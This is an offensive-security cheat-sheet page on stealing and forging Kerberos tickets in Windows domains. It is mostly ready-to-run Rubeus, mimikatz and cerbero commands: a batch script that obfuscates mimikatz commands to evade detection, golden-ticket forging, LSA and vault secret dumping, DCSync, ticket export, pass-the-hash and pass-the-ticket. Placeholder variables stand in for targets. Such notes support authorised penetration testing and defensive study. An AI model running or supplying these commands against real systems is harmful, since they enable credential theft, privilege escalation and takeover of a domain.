---
layout: post
title: credentials / krb
category: 04-credentials
parent: cheatsheets
modified_date: 2025-02-05
permalink: /creds/krb
---

**Mitre Att&ck Entreprise**: [T1558 Steal and Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) 

**Menu**
<!-- vscode-markdown-toc -->
* [tools](#tools)
	* [load-rubeus](#load-rubeus)
* [technics](#technics)
	* [command-obfuscation](#command-obfuscation)
	* [cleartext-2-nthash](#cleartext-2-nthash)
	* [get-tgt](#get-tgt)
	* [golden](#golden)
	* [silver](#silver)
	* [vault](#vault)
	* [lsadump-lsa](#lsadump-lsa)
	* [lsadump-dcsync](#lsadump-dcsync)
	* [ccache-convert](#ccache-convert)
	* [krb-export](#krb-export)
	* [krb-pth](#krb-pth)
	* [krb-ptt](#krb-ptt)
* [which-os-what-creds](#which-os-what-creds)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->



## <a name='tools'></a>tools

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var mm = ["https://api.github.com/repos/GhostPack/Rubeus","https://api.github.com/repos/Flangvik/BetterSafetyKatz","https://api.github.com/repos/gentilkiwi/mimikatz","https://api.github.com/repos/zer1t0/cerbero","https://api.github.com/repos/skelsec/pypykatz"]; for (rep in mm) {$.ajax({type: "GET", url: mm[rep], dataType: "json", success: function(result) {$("#mm_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="mm">
    <table id="mm_list" class="sortable">
      <tr><th>_repo</th><th>_last_pushed</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>

### <a name='load-rubeus'></a>load-rubeus
```powershell
```

## <a name='technics'></a>technics

### <a name='command-obfuscation'></a>command-obfuscation
```bat
REM script file to obfuscate the token manipulation commands 
 @echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\SafetyKatz.exe %Pwn% exit
```

### <a name='cleartext-2-nthash'></a>cleartext-2-nthash
```powershell
# compute nthash from clear-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

### <a name='get-tgt'></a>get-tgt
```powershell
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv

./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

## forged-tickets

### <a name='golden'></a>diamond

* TGT modification, avoid detection of forged TGT without PREAUTH 
* requires the KRBTGT$ account hash

### <a name='golden'></a>golden

* TGT forging, there is no PREAUTH / Kerberos AS-REQ, AS-REP exchanges with the DC
* requires the KRBTGT$ account hash

```powershell
# contains secrets for the: scheduled tasks, ...
Rubeus.exe -args golden /aes256:$ztarg_user_aes256k /sid:$ztarg_user_sid /ldap /user:$ztarg_user_name /printcmd

.\Loader.exe -path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### <a name='silver'></a>silver

* service account hash required to forgort a TGS
* it is mostly the machine account hash, valid for 30 days by default
* more silent than the golden ticket, no kerberos interaction with the DC (aka no AS-REQ, TGS-REQ)

| Service Type 				| 	Service Silver Tickets 	|
|---------------------------|---------------------------|
| WMI						| HOST RPCSS				|
| PowerShell Remoting 		| HOST HTTP (WSMAN RPCSS)	|
| WinRM						| HOST HTTP	 	 			|
| Scheduled Tasks 			| HOST 						| 
| Windows File Share (CIFS) | CIFS 						|
| LDAP operations (DCSync)  | LDAP 						|	
| Windows RSAT 				| RPCSS LDAP CIFS 			|	


### <a name='vault'></a>vault
```powershell
# contains secrets for the: scheduled tasks, ...
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

### <a name='lsadump-lsa'></a>lsadump-lsa
```powershell
# dump lsa process
Invoke-Mimi -Command '"token::elevate" "lsadump::lsa /patch"'
Invoke-Mimi -Command '"token::elevate" "sekurlsa::evasive-keys /patch"'
```
### <a name='lsadump-dcsync'></a>lsadump-dcsync
```powershell
# dcsync
Invoke-Mimi -Command '"token::elevate" "lsadump::dcsync"'
```

### <a name='ccache-convert'></a>ccache-convert

```python
# Convert linux to windows krb ticket :
ticketConverter.py $ztarg_user_name".ccache" $ztarg_user_name".krb"
cerbero convert -i $ztarg_user_name".ccache" -o $ztarg_user_name".krb"
```

### <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

### <a name='krb-pth'></a>krb-pth
```powershell
# run powershell with pass-the-hash
mimikatz.exe
privilege::debug
sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"

# opth
Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_user_hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### <a name='krb-ptt'></a>krb-ptt
```bash
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:$ztarg_
user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
```

## <a name='which-os-what-creds'></a>which-os-what-creds

![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
